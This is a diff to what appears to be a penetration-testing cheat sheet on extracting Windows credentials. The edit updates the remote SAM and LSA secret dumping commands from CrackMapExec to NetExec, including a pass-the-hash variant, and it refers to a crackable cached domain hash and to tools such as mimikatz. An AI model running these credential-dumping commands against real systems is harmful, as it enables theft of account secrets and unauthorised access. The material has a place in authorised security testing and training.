@@ -38,13 +38,13 @@ DOMAIN.LOCAL/svc_backup:$DCC2$10240#svc_backup#a1b2...  <- crackable, hashcat -m
 
 ```
 
-### Remotely (CrackMapExec / NetExec)
+### Remotely (NetExec)
 
 ```bash
 
-cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' --sam
-cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' --lsa
-cme smb TARGET -u 'USER_NAME' -H 'LOCAL_ADMIN_NT_HASH' --local-auth --sam
+nxc smb TARGET -u 'USER_NAME' -p 'USER_PASS' --sam
+nxc smb TARGET -u 'USER_NAME' -p 'USER_PASS' --lsa
+nxc smb TARGET -u 'USER_NAME' -H 'LOCAL_ADMIN_NT_HASH' --local-auth --sam
 
 ```
 
@@ -93,5 +93,5 @@ Delete any hive files you saved to disk (`C:\Temp\*.save`) during cleanup.
 ## References
 
 - impacket (secretsdump.py) - https://github.com/fortra/impacket
-- CrackMapExec / NetExec - https://github.com/Pennyw0rth/NetExec
+- NetExec - https://github.com/Pennyw0rth/NetExec
 - mimikatz - https://github.com/gentilkiwi/mimikatz
